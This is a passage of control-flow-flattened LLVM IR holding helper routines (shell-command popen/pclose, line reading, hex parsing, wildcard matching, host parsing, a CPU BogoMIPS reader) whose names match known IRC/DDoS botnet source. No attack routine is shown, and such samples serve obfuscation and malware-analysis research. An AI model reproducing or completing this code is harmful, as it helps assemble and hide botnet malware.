  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0), i8* %112, i8* null) #5
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 -842742829, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 374717149, i32 1258495180
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 -2103313670, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 -2103313670, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 1765070651, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #2

; Function Attrs: nounwind
declare i32 @getdtablesize() #2

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #2

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #2

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 445791287, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 445791287, label %first
    i32 -470554396, label %13
    i32 -637368631, label %21
    i32 -1824696847, label %22
    i32 285285733, label %30
    i32 442838785, label %37
    i32 2022288079, label %41
    i32 1872745130, label %45
    i32 -1429872568, label %47
    i32 -374846340, label %56
    i32 -222106948, label %57
    i32 -1701689973, label %64
    i32 -959671551, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -637368631, i32 -470554396
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -637368631, i32 -1824696847
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -959671551, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #5
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #5
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #5
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #5
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #5
  store i32 285285733, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 442838785, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 2022288079, i32 1872745130
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 1872745130, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 285285733, i32 -1429872568
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #5
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -374846340, i32 -222106948
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -1701689973, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 -1701689973, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -959671551, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

declare i32 @waitpid(i32, i32*, i32) #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 803827877, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 803827877, label %9
    i32 1504591920, label %13
    i32 -1784541431, label %18
    i32 2102278032, label %27
    i32 1624376830, label %29
    i32 -1271593471, label %39
    i32 144856744, label %43
    i32 247906822, label %44
    i32 -132250873, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 1504591920, i32 2102278032
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -1784541431, i32 2102278032
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 2102278032, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 1624376830, i32 -1271593471
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 803827877, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 144856744, i32 247906822
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -132250873, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 -132250873, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -930643302, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -930643302, label %4
    i32 -2077447315, label %10
    i32 -1759076471, label %13
    i32 1055623901, label %15
    i32 -1787766985, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 -2077447315, i32 -1759076471
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 -1759076471, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 1055623901, i32 -1787766985
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -930643302, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1938624791, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 1938624791, label %NodeBlock5
    i32 2104380769, label %NodeBlock
    i32 367262482, label %LeafBlock3
    i32 -1280274598, label %LeafBlock1
    i32 124811606, label %LeafBlock
    i32 -1244083967, label %14
    i32 2136547074, label %18
    i32 1272465500, label %25
    i32 1881036006, label %31
    i32 -686618631, label %38
    i32 916843382, label %39
    i32 -237740108, label %42
    i32 -1283737049, label %48
    i32 -863933268, label %56
    i32 190270354, label %NewDefault
    i32 11384440, label %59
    i32 1895659170, label %70
    i32 810881963, label %78
    i32 -1387495584, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 124811606, i32 2104380769
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1280274598, i32 367262482
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -237740108, i32 190270354
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 2136547074, i32 190270354
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -1244083967, i32 190270354
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -1387495584, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 1272465500, i32 916843382
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1881036006, i32 -686618631
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -686618631, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 916843382, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -1387495584, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -1283737049, i32 -863933268
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -863933268, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -1387495584, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 11384440, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 1895659170, i32 810881963
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 810881963, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -1387495584, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1287409349, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1287409349, label %first
    i32 1009235271, label %13
    i32 -1129654759, label %14
    i32 1378190924, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 1009235271, i32 -1129654759
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1378190924, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1378190924, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -1906519500, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1906519500, label %3
    i32 -1685349650, label %8
    i32 388655511, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 -1685349650, i32 388655511
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -1906519500, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.38, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -113099638, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -113099638, label %8
    i32 767888316, label %14
    i32 -917349803, label %21
    i32 -985667273, label %24
    i32 1141994674, label %30
    i32 203777373, label %36
    i32 1979556006, label %41
    i32 1138773350, label %43
    i32 1117692951, label %46
    i32 1080572751, label %47
    i32 -646185926, label %57
    i32 145972150, label %66
    i32 -790864214, label %68
    i32 465190630, label %74
    i32 2113727100, label %79
    i32 553900623, label %82
    i32 -1977146331, label %88
    i32 -9774098, label %90
    i32 1058394647, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 767888316, i32 -9774098
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 -917349803, i32 -1977146331
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 -985667273, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 1979556006, i32 1141994674
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 1979556006, i32 203777373
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 1979556006, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 1138773350, i32 1117692951
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 -985667273, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1080572751, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 145972150, i32 -646185926
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
